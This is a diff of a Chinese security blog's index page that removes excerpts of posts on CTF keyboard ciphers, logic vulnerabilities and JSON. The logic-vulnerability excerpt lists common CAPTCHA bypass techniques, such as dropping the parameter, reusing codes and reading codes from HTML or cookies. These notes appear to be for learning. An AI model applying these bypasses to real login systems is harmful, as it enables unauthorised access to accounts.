-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/11/ctf%E5%AF%86%E7%A0%81%E5%AD%A6/">ctf密码学</a>
-    </h1>
-  
-
-        
-        <a href="/2022/01/11/ctf%E5%AF%86%E7%A0%81%E5%AD%A6/" class="archive-article-date">
-  	<time datetime="2022-01-11T14:54:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="键盘加密"><a href="#键盘加密" class="headerlink" title="键盘加密"></a>键盘加密</h1><h2 id="键盘布局加密："><a href="#键盘布局加密：" class="headerlink" title="键盘布局加密："></a>键盘布局加密：</h2><p>键盘布局加密基本上是脑洞题，通常都是一推无意义的字符，但是把字符在键盘上布局比划一下，就可以根据形状拼出相应字符。</p>
-<h2 id="键盘坐标加密："><a href="#键盘坐标加密：" class="headerlink" title="键盘坐标加密："></a>键盘坐标加密：</h2><p>键盘坐标加密主要是利用键盘上面的字母和数字行来加密，具体又有两种方法:</p>
-<ol>
-<li>以字母行所在的行号作为横坐标，数字所对应的列为纵坐标。</li>
-</ol>
-<p>eg：a:21 b:35</p>
-<ol start="2">
-<li>以数字所对应的列为横坐标，字母所在的行号为纵坐标。</li>
-</ol>
-<p>eg: a:21 b:53</p>
-        
-          <a class="article-more-a" href="/2022/01/11/ctf%E5%AF%86%E7%A0%81%E5%AD%A6/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/11/ctf%E5%AF%86%E7%A0%81%E5%AD%A6/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-逻辑漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2021/12/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2021-12-28T03:35:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="验证码绕过，密码找回漏洞"><a href="#验证码绕过，密码找回漏洞" class="headerlink" title="验证码绕过，密码找回漏洞"></a>验证码绕过，密码找回漏洞</h1><h2 id="验证码绕过常见姿势"><a href="#验证码绕过常见姿势" class="headerlink" title="验证码绕过常见姿势"></a>验证码绕过常见姿势</h2><ol>
-<li><p>前端验证验证码，并没有后端验证，直接抓包然后进行跑数据包，反正没有验证码的阻碍。</p>
-</li>
-<li><p>验证码设置了但是并没有验证，乱输入验证码也能够成功的登录。</p>
-</li>
-<li><p>验证码可以重复使用。</p>
-</li>
-<li><p>验证码空值绕过，比如我们抓一个包，发现有验证码参数，但是我们去掉验证码的参数就可以绕过验证码机制。验证码就失败了。</p>
-</li>
-<li><p>验证码干扰过低，使用脚本识别。</p>
-</li>
-<li><p>验证码在直接在html里面输出。</p>
-</li>
-<li><p>验证码可控，比如他的验证码包含在url面，是一个url传参，我们可以把url设置定，那么验证码可设置。</p>
-</li>
-<li><p>验证码有规则，比如用时间戳的后6位。</p>
-</li>
-<li><p>万能验证码，验证码无论是什么，只要输入特定数字就可以直接绕过。</p>
-</li>
-<li><p>验证码有时候会在cookie里面，分析一下是不是存在验证码的参数。</p>
-</li>
-<li><p>图片验证码，类型太少，容易识别。</p>
-</li>
-<li><p>多次登录后才出现验证码绕过:</p>
-</li>
-<li><p>基于session</p>
-</li>
-<li><p>基于ip</p>
-</li>
-<li><p>基于用户</p>
-</li>
-</ol>
-        
-          <a class="article-more-a" href="/2021/12/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/12/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-json格式解析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/14/json%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/">json格式解析</a>
-    </h1>
-  
-
-        
-        <a href="/2021/12/14/json%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2021-12-14T08:14:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="json文件格式"><a href="#json文件格式" class="headerlink" title="json文件格式"></a>json文件格式</h1><h2 id="JSON是什么"><a href="#JSON是什么" class="headerlink" title="JSON是什么"></a>JSON是什么</h2><p>（JavaScript Object Notation）json是一种轻量级的数据交换格式。现在是理想的数据交换语言。</p>
-<h3 id="JSON构建于两种结构："><a href="#JSON构建于两种结构：" class="headerlink" title="JSON构建于两种结构："></a>JSON构建于两种结构：</h3><h4 id="1-“名称-值”对的集合（A-collection-of-name-value-pairs）。（在不同得语言有类似的不同叫法，比如python中有点像字典）"><a href="#1-“名称-值”对的集合（A-collection-of-name-value-pairs）。（在不同得语言有类似的不同叫法，比如python中有点像字典）" class="headerlink" title="1.“名称/值”对的集合（A collection of name/value pairs）。（在不同得语言有类似的不同叫法，比如python中有点像字典）"></a>1.“名称/值”对的集合（A collection of name/value pairs）。（在不同得语言有类似的不同叫法，比如python中有点像字典）</h4><h4 id="2-值得有序列表。（大部分被理解为数组）"><a href="#2-值得有序列表。（大部分被理解为数组）" class="headerlink" title="2. 值得有序列表。（大部分被理解为数组）"></a>2. 值得有序列表。（大部分被理解为数组）</h4>
-        
-          <a class="article-more-a" href="/2021/12/14/json%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/12/14/json%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -1565,8 +516,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
